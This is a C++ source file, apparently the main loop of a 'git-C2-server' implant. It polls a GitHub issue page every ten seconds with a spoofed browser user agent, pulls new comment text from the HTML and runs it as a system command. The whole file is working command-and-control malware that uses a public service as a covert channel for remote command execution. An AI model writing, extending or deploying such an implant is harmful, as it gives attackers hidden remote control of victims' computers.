#include "include/httpRequest.hpp"
#include "include/fileManager.hpp"
#include "include/htmlParser.hpp"
#include "include/cmd.hpp"
#include "include/execCmd.hpp"
#include <iostream>
#include <chrono>
#include <thread>
#include <string> 
#include <vector>  

int main() {
    HttpRequest httpRequest;
    
    std::string url = "https://github.com/Momollax/git-C2-server/issues/2";
    std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";

    Cmd cmd;
    HtmlParser htmlParser(cmd);
    ExecCmd execCmd("");  
    std::size_t previousMatchCount = 0; 

    while (true) {
        std::string response = httpRequest.get(url, userAgent);
        std::string extractedContent = htmlParser.extractContent(response);
        if (cmd.addContentIfChanged(extractedContent)) {
            const std::vector<std::string>& allContent = cmd.getAllContent();
            const std::string& lastContent = cmd.getLastContent();
            if (htmlParser.getcmd_number() != previousMatchCount) {
                ExecCmd execCmd(lastContent);
                execCmd.executeCommand();
                previousMatchCount = htmlParser.getcmd_number();
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    return 0;
}
